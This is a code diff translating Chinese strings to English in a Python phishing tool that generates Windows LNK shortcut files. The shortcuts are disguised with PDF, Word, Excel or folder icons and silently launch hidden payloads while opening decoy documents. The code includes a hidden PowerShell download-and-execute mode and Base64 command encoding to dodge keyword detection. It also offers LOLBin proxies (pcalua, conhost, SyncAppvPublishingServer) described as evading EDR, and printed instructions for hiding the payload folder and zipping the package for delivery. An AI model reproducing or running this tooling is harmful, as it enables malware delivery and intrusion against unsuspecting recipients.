@@ -8,56 +8,56 @@ from config import OUTPUT_DIR
 
 
 # ============================================================
-# 图标配置 — 只使用 Windows 系统必定自带的图标文件
+# Icon Configuration — uses only icons guaranteed on Windows
 # ============================================================
 ICON_CONFIG = {
-    "PDF 文档": {
+    "PDF Document": {
         "options": [
-            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 122, "label": "PDF图标 (imageres.dll)"},
-            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 1, "label": "通用文档图标 (shell32.dll)"},
+            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 122, "label": "PDF Icon (imageres.dll)"},
+            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 1, "label": "Generic Document Icon (shell32.dll)"},
         ]
     },
-    "Word 文档": {
+    "Word Document": {
         "options": [
-            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 122, "label": "文档图标 (imageres.dll)"},
-            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 1, "label": "通用文档图标 (shell32.dll)"},
+            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 122, "label": "Document Icon (imageres.dll)"},
+            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 1, "label": "Generic Document Icon (shell32.dll)"},
         ]
     },
-    "Excel 文档": {
+    "Excel Document": {
         "options": [
-            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 123, "label": "表格图标 (imageres.dll)"},
-            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 1, "label": "通用文档图标 (shell32.dll)"},
+            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 123, "label": "Spreadsheet Icon (imageres.dll)"},
+            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 1, "label": "Generic Document Icon (shell32.dll)"},
         ]
     },
-    "文件夹": {
+    "Folder": {
         "options": [
-            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 3, "label": "文件夹图标"},
-            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 3, "label": "文件夹图标2"},
+            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 3, "label": "Folder Icon"},
+            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 3, "label": "Folder Icon 2"},
         ]
     },
-    "图片文件": {
+    "Image File": {
         "options": [
-            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 67, "label": "图片图标"},
+            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 67, "label": "Image Icon"},
         ]
     },
 }
 
 
 # ============================================================
-# LNK 文件生成 — 三级回退
-# win32com → PowerShell → VBScript
+# LNK File Generation — three-level fallback
+# win32com -> PowerShell -> VBScript
 # ============================================================
 
 def create_lnk_file(output_path, target_path, arguments="", icon_path="",
                      icon_index=0, description="", working_dir="", window_style=7):
     """
-    生成 LNK 快捷方式文件。
-    按优先级尝试：win32com → PowerShell → VBScript
-    返回: (success: bool, message: str)
+    Generate an LNK shortcut file.
+    Tries in order: win32com -> PowerShell -> VBScript
+    Returns: (success: bool, message: str)
     """
     os.makedirs(os.path.dirname(output_path), exist_ok=True)
 
-    # 方式1：win32com
+    # Method 1: win32com
     try:
         return _create_lnk_win32com(
             output_path, target_path, arguments, icon_path,
@@ -66,7 +66,7 @@ def create_lnk_file(output_path, target_path, arguments="", icon_path="",
     except Exception:
         pass
 
-    # 方式2：PowerShell
+    # Method 2: PowerShell
     try:
         return _create_lnk_powershell(
             output_path, target_path, arguments, icon_path,
@@ -75,14 +75,14 @@ def create_lnk_file(output_path, target_path, arguments="", icon_path="",
     except Exception:
         pass
 
-    # 方式3：VBScript
+    # Method 3: VBScript
     try:
         return _create_lnk_vbscript(
             output_path, target_path, arguments, icon_path,
             icon_index, description, working_dir, window_style
         )
     except Exception as e:
-        return False, f"所有 LNK 生成方式均失败: {str(e)}"
+        return False, f"All LNK generation methods failed: {str(e)}"
 
 
 def _create_lnk_win32com(output_path, target_path, arguments, icon_path,
@@ -99,7 +99,7 @@ def _create_lnk_win32com(output_path, target_path, arguments, icon_path,
     if icon_path:
         shortcut.IconLocation = f"{icon_path},{icon_index}"
     shortcut.save()
-    return True, f"LNK 文件已生成（win32com）: {output_path}"
+    return True, f"LNK file generated (win32com): {output_path}"
 
 
 def _create_lnk_powershell(output_path, target_path, arguments, icon_path,
@@ -126,10 +126,10 @@ $s.WindowStyle = {window_style}
         capture_output=True, text=True, timeout=15
     )
     if result.returncode != 0:
-        raise Exception(f"PowerShell 错误: {result.stderr}")
+        raise Exception(f"PowerShell error: {result.stderr}")
     if os.path.exists(output_path):
-        return True, f"LNK 文件已生成（PowerShell）: {output_path}"
-    raise Exception("PowerShell 执行完成但文件未生成")
+        return True, f"LNK file generated (PowerShell): {output_path}"
+    raise Exception("PowerShell completed but file was not created")
 
 
 def _create_lnk_vbscript(output_path, target_path, arguments, icon_path,
@@ -160,10 +160,10 @@ sc.WindowStyle = {window_style}
             capture_output=True, text=True, timeout=15
         )
         if result.returncode != 0:
-            raise Exception(f"VBScript 错误: {result.stderr}")
+            raise Exception(f"VBScript error: {result.stderr}")
         if os.path.exists(output_path):
-            return True, f"LNK 文件已生成（VBScript）: {output_path}"
-        raise Exception("VBScript 执行完成但文件未生成")
+            return True, f"LNK file generated (VBScript): {output_path}"
+        raise Exception("VBScript completed but file was not created")
     finally:
         try:
             os.remove(vbs_path)
@@ -172,7 +172,7 @@ sc.WindowStyle = {window_style}
 
 
 # ============================================================
-# 执行方式模板
+# Execution Mode Templates
 # ============================================================
 
 def _random_str(length=8):
@@ -180,7 +180,7 @@ def _random_str(length=8):
 
 
 def build_explorer_open(payload_relative_path, decoy_relative_path=""):
-    """Explorer 打开 — 最自然，适用 EXE"""
+    """Explorer open — most natural, suitable for EXE"""
     target = "C:\\Windows\\explorer.exe"
     arguments = payload_relative_path
 
@@ -192,14 +192,14 @@ def build_explorer_open(payload_relative_path, decoy_relative_path=""):
 
 
 def build_direct_target(payload_relative_path, decoy_relative_path=""):
-    """直接指向 Payload — 进程链最干净"""
+    """Direct target — cleanest process chain"""
     target = payload_relative_path
     arguments = ""
     return target, arguments
 
 
 def build_powershell_relative(ps_script_relative_path, decoy_relative_path=""):
-    """PowerShell 执行脚本 — 适用 .ps1"""
+    """PowerShell script execution — for .ps1 files"""
     target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
     arguments = f'-nop -w hidden -ep bypass -f "{ps_script_relative_path}"'
     if decoy_relative_path:
@@ -208,7 +208,7 @@ def build_powershell_relative(ps_script_relative_path, decoy_relative_path=""):
 
 
 def build_mshta_relative(hta_relative_path, decoy_relative_path=""):
-    """MSHTA 执行HTA — 适用 .hta"""
+    """MSHTA execution — for .hta files"""
     target = "C:\\Windows\\System32\\mshta.exe"
     arguments = hta_relative_path
     if decoy_relative_path:
@@ -218,7 +218,7 @@ def build_mshta_relative(hta_relative_path, decoy_relative_path=""):
 
 
 def build_wscript_relative(vbs_relative_path, decoy_relative_path=""):
-    """WScript 执行VBS — 适用 .vbs/.js"""
+    """WScript execution — for .vbs/.js files"""
     target = "C:\\Windows\\System32\\wscript.exe"
     arguments = vbs_relative_path
     if decoy_relative_path:
@@ -228,7 +228,7 @@ def build_wscript_relative(vbs_relative_path, decoy_relative_path=""):
 
 
 def build_rundll32_dll(dll_relative_path, export_function="DllMain", decoy_relative_path=""):
-    """Rundll32 加载DLL — 仅适用 .dll"""
+    """Rundll32 DLL loading — DLL files only"""
     target = "C:\\Windows\\System32\\rundll32.exe"
     arguments = f'"{dll_relative_path}",{export_function}'
     if decoy_relative_path:
@@ -241,7 +241,7 @@ def build_rundll32_dll(dll_relative_path, export_function="DllMain", decoy_relat
 
 
 def build_powershell_download_exec(download_url, download_filename="update.exe", decoy_relative_path=""):
-    """PowerShell 远程下载"""
+    """PowerShell remote download"""
     target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
     temp_file = f'$env:TEMP\\{download_filename}'
     arguments = (
@@ -250,12 +250,12 @@ def build_powershell_download_exec(download_url, download_filename="update.exe",
         f'Start-Process \'{temp_file}\'"'
     )
     if decoy_relative_path:
-        arguments = arguments.rstrip('"') + f';Start-Process \\"{decoy_relative_path}\\""'
+        arguments = arguments.rstrip('"') + f';Start-Process \\"{decoy_relative_path}\\"\"'
     return target, arguments
 
 
 def build_powershell_base64_cmd(command, decoy_relative_path=""):
-    """PowerShell Base64 命令"""
+    """PowerShell Base64-encoded command"""
     target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
     full_command = command
     if decoy_relative_path:
@@ -266,7 +266,7 @@ def build_powershell_base64_cmd(command, decoy_relative_path=""):
 
 
 def build_conhost_exec(payload_relative_path, decoy_relative_path=""):
-    """Conhost 代理执行 — 替代 cmd.exe，监控较松"""
+    """Conhost proxy execution — less monitored than cmd.exe"""
     target = "C:\\Windows\\System32\\conhost.exe"
     if decoy_relative_path:
         arguments = f'cmd.exe /c start "" "{payload_relative_path}" & start "" "{decoy_relative_path}"'
@@ -276,15 +276,15 @@ def build_conhost_exec(payload_relative_path, decoy_relative_path=""):
 
 
 def build_pcalua_exec(payload_relative_path, decoy_relative_path=""):
-    """Pcalua 代理执行 — 微软签名 LOLBin，不经过 cmd"""
+    """Pcalua proxy execution — Microsoft-signed LOLBin, bypasses cmd"""
     target = "C:\\Windows\\System32\\pcalua.exe"
     arguments = f'-a "{payload_relative_path}"'
-    # pcalua 不支持同时打开第二个文件
+    # pcalua does not support opening a second file simultaneously
     return target, arguments
 
 
 def build_syncappv_exec(powershell_command, decoy_relative_path=""):
-    """SyncAppvPublishingServer 执行 — 利用 App-V 执行 PS"""
+    """SyncAppvPublishingServer execution — leverages App-V to run PS"""
     target = "C:\\Windows\\System32\\SyncAppvPublishingServer.exe"
     full_cmd = powershell_command
     if decoy_relative_path:
@@ -294,7 +294,7 @@ def build_syncappv_exec(powershell_command, decoy_relative_path=""):
 
 
 # ============================================================
-# 主生成函数
+# Main Generation Function
 # ============================================================
 
 def generate_lnk(
@@ -309,52 +309,52 @@ def generate_lnk(
     download_filename="update.exe",
 ):
     """
-    生成 LNK 快捷方式文件。
-    返回: (success: bool, message: str)
+    Generate an LNK shortcut file.
+    Returns: (success: bool, message: str)
     """
     try:
-        # 1. 构建 target + arguments
-        if execution_mode == "Explorer 打开":
+        # 1. Build target + arguments
+        if execution_mode == "Explorer Open":
             target, arguments = build_explorer_open(payload_relative_path, decoy_relative_path)
 
-        elif execution_mode == "直接指向 Payload":
+        elif execution_mode == "Direct Target":
             target, arguments = build_direct_target(payload_relative_path, decoy_relative_path)
 
-        elif execution_mode == "PowerShell 执行脚本":
+        elif execution_mode == "PowerShell Script":
             target, arguments = build_powershell_relative(payload_relative_path, decoy_relative_path)
 
-        elif execution_mode == "MSHTA 执行HTA":
+        elif execution_mode == "MSHTA Execute HTA":
             target, arguments = build_mshta_relative(payload_relative_path, decoy_relative_path)
 
-        elif execution_mode == "WScript 执行VBS":
+        elif execution_mode == "WScript Execute VBS":
             target, arguments = build_wscript_relative(payload_relative_path, decoy_relative_path)
 
-        elif execution_mode == "Rundll32 加载DLL":
+        elif execution_mode == "Rundll32 Load DLL":
             target, arguments = build_rundll32_dll(
                 payload_relative_path, dll_export_function, decoy_relative_path
             )
 
-        elif execution_mode == "PowerShell 远程下载":
+        elif execution_mode == "PowerShell Remote Download":
             target, arguments = build_powershell_download_exec(
                 command_or_url, download_filename, decoy_relative_path
             )
 
-        elif execution_mode == "PowerShell Base64 命令":
+        elif execution_mode == "PowerShell Base64 Command":
             target, arguments = build_powershell_base64_cmd(command_or_url, decoy_relative_path)
 
-        elif execution_mode == "Conhost 代理执行":
+        elif execution_mode == "Conhost Proxy":
             target, arguments = build_conhost_exec(payload_relative_path, decoy_relative_path)
 
-        elif execution_mode == "Pcalua 代理执行":
+        elif execution_mode == "Pcalua Proxy":
             target, arguments = build_pcalua_exec(payload_relative_path, decoy_relative_path)
 
-        elif execution_mode == "SyncAppvPublishingServer 执行":
+        elif execution_mode == "SyncAppvPublishingServer":
             target, arguments = build_syncappv_exec(command_or_url, decoy_relative_path)
 
         else:
-            return False, f"未知的执行方式: {execution_mode}"
+            return False, f"Unknown execution mode: {execution_mode}"
 
-        # 2. 图标
+        # 2. Icon
         icon_path = ""
         icon_index = 0
         if icon_type in ICON_CONFIG:
@@ -362,7 +362,7 @@ def generate_lnk(
             icon_path = first_opt["path"]
             icon_index = first_opt["index"]
 
-        # 3. 生成 LNK 文件
+        # 3. Generate LNK file
         if not output_filename.endswith(".lnk"):
             output_filename += ".lnk"
 
@@ -382,62 +382,62 @@ def generate_lnk(
         if not success:
             return False, gen_message
 
-        # 4. 钓鱼目录结构指引
+        # 4. Phishing directory structure guide
         is_local = not is_remote_mode(execution_mode)
 
-        guide_lines = [f"LNK 文件已生成: {os.path.abspath(output_path)}\n"]
+        guide_lines = [f"LNK file generated: {os.path.abspath(output_path)}\n"]
 
         if is_local:
             folder_name = output_filename.replace('.lnk', '')
             if '.' in folder_name:
                 folder_name = folder_name.rsplit('.', 1)[0]
 
-            guide_lines.append("请按以下目录结构组织钓鱼文件包：")
+            guide_lines.append("Organize phishing files with the following directory structure:")
             guide_lines.append("")
             guide_lines.append(f"  {folder_name}/")
-            guide_lines.append(f"  ├── {output_filename}  ← LNK（用户看到并双击）")
-            guide_lines.append(f"  └── data/  ← 隐藏目录")
+            guide_lines.append(f"  ├── {output_filename}  ← LNK (what the user sees and double-clicks)")
+            guide_lines.append(f"  └── data/  ← hidden directory")
 
             if payload_relative_path:
                 payload_name = payload_relative_path.replace('\\', '/').split('/')[-1]
-                guide_lines.append(f"      ├── {payload_name}  ← 你的payload")
+                guide_lines.append(f"      ├── {payload_name}  ← your payload")
 
             if decoy_relative_path:
                 decoy_name = decoy_relative_path.replace('\\', '/').split('/')[-1]
-                guide_lines.append(f"      └── {decoy_name}  ← 诱饵文档")
+                guide_lines.append(f"      └── {decoy_name}  ← decoy document")
 
             guide_lines.append("")
-            guide_lines.append("隐藏目录: attrib +h +s data")
-            guide_lines.append(f"打包发送: 将 {folder_name}/ 整个目录压缩为 ZIP/RAR")
+            guide_lines.append("Hide directory: attrib +h +s data")
+            guide_lines.append(f"Package for delivery: compress {folder_name}/ into ZIP/RAR")
 
         return True, '\n'.join(guide_lines)
 
     except Exception as e:
-        return False, f"生成 LNK 失败: {str(e)}"
+        return False, f"Failed to generate LNK: {str(e)}"
 
 
 # ============================================================
-# 辅助查询函数
+# Helper Query Functions
 # ============================================================
 
 def get_execution_modes():
-    """返回执行方式列表（含分组分隔线）"""
+    """Return execution mode list (with group separators)"""
     return [
-        "--- 直接执行（适用 EXE） ---",
-        "Explorer 打开",
-        "直接指向 Payload",
-        "--- 脚本执行 ---",
-        "PowerShell 执行脚本",
-        "MSHTA 执行HTA",
-        "WScript 执行VBS",
-        "Rundll32 加载DLL",
-        "--- 远程下载执行 ---",
-        "PowerShell 远程下载",
-        "PowerShell Base64 命令",
-        "--- 高级规避（不经过cmd） ---",
-        "Conhost 代理执行",
-        "Pcalua 代理执行",
-        "SyncAppvPublishingServer 执行",
+        "--- Direct Execution (EXE) ---",
+        "Explorer Open",
+        "Direct Target",
+        "--- Script Execution ---",
+        "PowerShell Script",
+        "MSHTA Execute HTA",
+        "WScript Execute VBS",
+        "Rundll32 Load DLL",
+        "--- Remote Download ---",
+        "PowerShell Remote Download",
+        "PowerShell Base64 Command",
+        "--- Advanced Evasion (bypass cmd) ---",
+        "Conhost Proxy",
+        "Pcalua Proxy",
+        "SyncAppvPublishingServer",
     ]
 
 
@@ -447,62 +447,62 @@ def get_icon_types():
 
 def get_mode_description(mode):
     descriptions = {
-        "Explorer 打开":
-            "使用 explorer.exe 打开 payload。最自然的执行方式，适用于 EXE 文件。\n"
-            "Payload路径填写相对路径，如：data\\payload.exe\n"
-            "✅ 单文件模式不经过 cmd.exe",
-        "直接指向 Payload":
-            "LNK 直接指向 payload 文件路径，Windows 根据文件类型自动执行。\n"
-            "进程链最干净，但 LNK 属性中可看到目标路径。\n"
-            "Payload路径填写相对路径，如：data\\payload.exe",
-        "PowerShell 执行脚本":
-            "使用 PowerShell 执行隐藏目录中的 .ps1 脚本。\n"
-            "Payload路径填写脚本路径，如：data\\script.ps1",
-        "MSHTA 执行HTA":
-            "使用 mshta.exe 执行隐藏目录中的 .hta 文件。\n"
-            "Payload路径填写 HTA 路径，如：data\\payload.hta",
-        "WScript 执行VBS":
-            "使用 wscript.exe 执行隐藏目录中的 .vbs 脚本。\n"
-            "Payload路径填写 VBS 路径，如：data\\script.vbs",
-        "Rundll32 加载DLL":
-            "使用 rundll32.exe 加载 DLL 文件（APT28/Fancy Bear 常用）。\n"
-            "⚠️ 仅适用于 DLL 文件，不能用于 EXE！\n"
-            "DLL 必须导出指定的函数（默认 DllMain）。\n"
-            "Payload路径填写 DLL 相对路径，如：data\\payload.dll",
-        "PowerShell 远程下载":
-            "使用 PowerShell 从远程 URL 下载并执行（不需要本地 payload 文件）。\n"
-            "命令/URL 填写远程文件地址。",
-        "PowerShell Base64 命令":
-            "将 PowerShell 命令 Base64 编码后执行，绕过命令行关键词检测。\n"
-            "命令/URL 填写 PowerShell 命令。",
-        "Conhost 代理执行":
-            "使用 conhost.exe 代替 cmd.exe 执行命令。\n"
-            "conhost 是控制台宿主进程，部分杀软/EDR 对其监控较松。\n"
-            "✅ 可规避部分针对 cmd.exe 的检测规则\n"
-            "适用于 EXE 文件。",
-        "Pcalua 代理执行":
-            "使用 pcalua.exe（程序兼容性助手）代理执行。\n"
-            "微软签名的 LOLBin，可启动任意 EXE。\n"
-            "✅ 不经过 cmd.exe，进程链：pcalua.exe → payload.exe\n"
-            "适用于 EXE 文件。",
-        "SyncAppvPublishingServer 执行":
-            "利用 App-V 组件 SyncAppvPublishingServer.exe 执行 PowerShell 命令。\n"
-            "微软签名程序，很多 EDR 不监控此进程。\n"
-            "✅ 不直接调用 powershell.exe\n"
-            "命令/URL 填写 PowerShell 命令。",
+        "Explorer Open":
+            "Use explorer.exe to open the payload. The most natural execution method for EXE files.\n"
+            "Payload path should be relative, e.g.: data\\payload.exe\n"
+            "✅ Single file mode does not go through cmd.exe",
+        "Direct Target":
+            "LNK points directly to the payload file path; Windows executes based on file type.\n"
+            "Cleanest process chain, but target path is visible in LNK properties.\n"
+            "Payload path should be relative, e.g.: data\\payload.exe",
+        "PowerShell Script":
+            "Use PowerShell to execute a .ps1 script in the hidden directory.\n"
+            "Payload path should point to the script, e.g.: data\\script.ps1",
+        "MSHTA Execute HTA":
+            "Use mshta.exe to execute an .hta file in the hidden directory.\n"
+            "Payload path should point to the HTA, e.g.: data\\payload.hta",
+        "WScript Execute VBS":
+            "Use wscript.exe to execute a .vbs script in the hidden directory.\n"
+            "Payload path should point to the VBS, e.g.: data\\script.vbs",
+        "Rundll32 Load DLL":
+            "Use rundll32.exe to load a DLL file (commonly used by APT28/Fancy Bear).\n"
+            "⚠️ Only works with DLLs, not EXEs!\n"
+            "DLL must export the specified function (default: DllMain).\n"
+            "Payload path should be relative, e.g.: data\\payload.dll",
+        "PowerShell Remote Download":
+            "Use PowerShell to download and execute from a remote URL (no local payload needed).\n"
+            "Enter the remote file URL in the Command/URL field.",
+        "PowerShell Base64 Command":
+            "Base64-encode a PowerShell command for execution, bypassing command-line keyword detection.\n"
+            "Enter the PowerShell command in the Command/URL field.",
+        "Conhost Proxy":
+            "Use conhost.exe instead of cmd.exe to execute commands.\n"
+            "conhost is the console host process; some AV/EDR monitor it less strictly.\n"
+            "✅ Can evade some cmd.exe-specific detection rules\n"
+            "Works with EXE files.",
+        "Pcalua Proxy":
+            "Use pcalua.exe (Program Compatibility Assistant) as a proxy launcher.\n"
+            "Microsoft-signed LOLBin that can launch any EXE.\n"
+            "✅ Does not go through cmd.exe; process chain: pcalua.exe -> payload.exe\n"
+            "Works with EXE files.",
+        "SyncAppvPublishingServer":
+            "Leverage App-V component SyncAppvPublishingServer.exe to run PowerShell commands.\n"
+            "Microsoft-signed binary; many EDRs do not monitor this process.\n"
+            "✅ Does not directly invoke powershell.exe\n"
+            "Enter the PowerShell command in the Command/URL field.",
     }
     return descriptions.get(mode, "")
 
 
 def is_remote_mode(mode):
-    """判断是否为远程/命令模式（不需要本地payload路径）"""
+    """Check if the mode is remote/command-based (no local payload path needed)"""
     return mode in [
-        "PowerShell 远程下载",
-        "PowerShell Base64 命令",
-        "SyncAppvPublishingServer 执行",
+        "PowerShell Remote Download",
+        "PowerShell Base64 Command",
+        "SyncAppvPublishingServer",
     ]
 
 
 def is_separator(mode):
-    """判断是否为分隔线"""
+    """Check if the entry is a separator line"""
     return mode.startswith("---")
